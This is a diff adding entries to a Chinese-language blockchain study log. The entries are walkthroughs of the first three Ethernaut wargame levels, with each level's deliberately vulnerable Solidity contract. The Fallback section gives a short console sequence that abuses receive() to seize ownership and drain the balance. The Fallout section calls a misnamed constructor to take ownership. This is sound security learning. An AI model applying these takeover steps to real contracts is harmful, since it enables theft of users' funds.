@@ -533,6 +533,10 @@ func main() {
 
 
 
+
+
+### 2025.12.16
+
 #### Part II. Geth 进阶
 
 知识点学习：
@@ -772,6 +776,227 @@ go run ./monitor_setup.go
 - **[新区块]** 日志告诉你**过去**发生了什么（已经确认的事实）。
 - **[Pending]** 日志告诉你**未来**可能发生什么（正在排队的意图）。
 
+
+
+
+
+
+### 2025.12.23
+
+#### 0. Hello Ethernaut
+
+进入界面，然后打开控制台见如下界面
+
+![nipaste_2024-08-20_14-14-0](https://github.com/henrymartin262/PKUBA-Colearn-25-Fall/blob/main/img/Snipaste_2024-08-20_14-14-04.png)
+
+这道题主要是用来介绍如何使用控制台交互合约以及 MetaMask 交互，按提示可以一步一步完成。
+
+```sh
+await contract.info()
+await contract.info1()
+await contract.info2("hello")
+await contract.infoNum()
+await contract.info42()
+await contract.theMethodName()
+await contract.method7123949()
+await contract.password()
+await contract.authenticate("ethernaut0")
+```
+
+输入完，提交instance即可。
+
+![nipaste_2024-08-20_14-26-4](https://github.com/henrymartin262/PKUBA-Colearn-25-Fall/blob/main/img/Snipaste_2024-08-20_14-26-44.png)
+
+最后刚刚交互的整个合约代码如下：
+
+```javascript
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Instance {
+    string public password;
+    uint8 public infoNum = 42;
+    string public theMethodName = "The method name is method7123949.";
+    bool private cleared = false;
+
+    // constructor
+    constructor(string memory _password) {
+        password = _password;
+    }
+
+    function info() public pure returns (string memory) {
+        return "You will find what you need in info1().";
+    }
+
+    function info1() public pure returns (string memory) {
+        return 'Try info2(), but with "hello" as a parameter.';
+    }
+
+    function info2(string memory param) public pure returns (string memory) {
+        if (keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked("hello"))) {
+            return "The property infoNum holds the number of the next info method to call.";
+        }
+        return "Wrong parameter.";
+    }
+
+    function info42() public pure returns (string memory) {
+        return "theMethodName is the name of the next method.";
+    }
+
+    function method7123949() public pure returns (string memory) {
+        return "If you know the password, submit it to authenticate().";
+    }
+
+    function authenticate(string memory passkey) public {
+        if (keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) {
+            cleared = true;
+        }
+    }
+
+    function getCleared() public view returns (bool) {
+        return cleared;
+    }
+}
+```
+
+
+
+
+
+#### 1. Fallback
+
+**目标：**
+
+- 成为合约的owner
+- 将余额减少为0
+
+**合约代码：**
+
+```javascript
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Fallback {
+    mapping(address => uint256) public contributions;
+    address public owner;
+	//owner 被设置为部署合约的账户地址 (msg.sender)，同时，合约部署者的贡献值被初始化为 1000 以太币 (1 ether 是 Solidity 中的单位，表示 1 ETH)
+    constructor() {
+        owner = msg.sender;
+        contributions[msg.sender] = 1000 * (1 ether);
+    }
+	//modifier onlyOwner()：定义了一个名为 onlyOwner 的修饰符。修饰符的名字可以是任意的，但通常会反映它的功能
+    modifier onlyOwner() {
+        require(msg.sender == owner, "caller is not the owner");
+        _;
+    }
+	// 将合约所属者移交给贡献最高的人，这也意味着你必须要贡献1000ETH以上才有可能成为合约的owner
+    function contribute() public payable {
+        require(msg.value < 0.001 ether);
+        contributions[msg.sender] += msg.value;
+        if (contributions[msg.sender] > contributions[owner]) {
+            owner = msg.sender;
+        }
+    }
+
+    function getContribution() public view returns (uint256) {
+        return contributions[msg.sender];
+    }
+	//首先，onlyOwner 修饰符中的 require 语句会检查调用者 (msg.sender) 是否是合约的所有者，如果检查通过（msg.sender == owner），函数继续执行
+    //这个函数将合约中所有的以太币余额转移到所有者账户中	
+    function withdraw() public onlyOwner {
+        payable(owner).transfer(address(this).balance);
+    }
+	//receive 是一个特殊的函数，当合约接收到以太币而没有调用任何函数时，它会被自动调用
+    receive() external payable {
+        require(msg.value > 0 && contributions[msg.sender] > 0);
+        owner = msg.sender;
+    }
+}
+```
+
+先来审计上面的合约代码，能修改合约 owner 的地方总共有三处，第一处构造函数`constructor`，显然我们无法在这里修改owner。第二处`contribute()`，但这个函数要求我们贡献1000eth才可以成为合约的owner，显然也不违背了我们的初衷（笑）。第三处` receive()`，这个函数在发生交易时，会被自动调用，且会将owner设置为消息发送者，因此我们需要利用这个函数。
+
+来看看触发条件
+
+- msg.value > 0：contract.sendTransaction({value:1}) 即可
+- contributions[msg.sender] > 0：可以通过调用 contribute 来实现
+
+所以说最终攻击代码如下：
+
+```scss
+await contract.contribute({value: toWei("0.0001")})
+await contract.sendTransaction({value: toWei("0.0001")})
+contract.owner()
+contract.withdraw()	//这个函数将合约中所有的以太币余额转移到所有者账户中	
+```
+
+![nipaste_2024-08-20_15-54-2](https://github.com/henrymartin262/PKUBA-Colearn-25-Fall/blob/main/img/Snipaste_2024-08-20_15-54-21.png)
+
+
+
+#### 2. Fallout
+
+**目标**
+
+获取合约的owner权限
+
+**合约代码**
+
+```javascript
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import "openzeppelin-contracts-06/math/SafeMath.sol";
+
+contract Fallout {
+    using SafeMath for uint256;
+
+    mapping(address => uint256) allocations;
+    address payable public owner;
+
+    /* constructor */
+    function Fal1out() public payable {
+        owner = msg.sender;
+        allocations[owner] = msg.value;
+    }
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "caller is not the owner");
+        _;
+    }
+
+    function allocate() public payable {
+        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
+    }
+
+    function sendAllocation(address payable allocator) public {
+        require(allocations[allocator] > 0);
+        allocator.transfer(allocations[allocator]);
+    }
+
+    function collectAllocations() public onlyOwner {
+        msg.sender.transfer(address(this).balance);
+    }
+
+    function allocatorBalance(address allocator) public view returns (uint256) {
+        return allocations[allocator];
+    }
+}
+```
+
+通过审计上面的代码可以发现，构造函数名称与合约名称不一致使其成为一个public类型的函数，即任何人都可以调用，所以可以直接调用构造函数Fal1out来获取合约的ower权限。
+
+```
+contract.Fal1out()
+```
+
+![nipaste_2024-08-21_14-19-2](https://github.com/henrymartin262/PKUBA-Colearn-25-Fall/blob/main/img/Snipaste_2024-08-21_14-19-26.png)
+
+最后成功获取到owner权限
+
+
+
+#### 
 
 
 
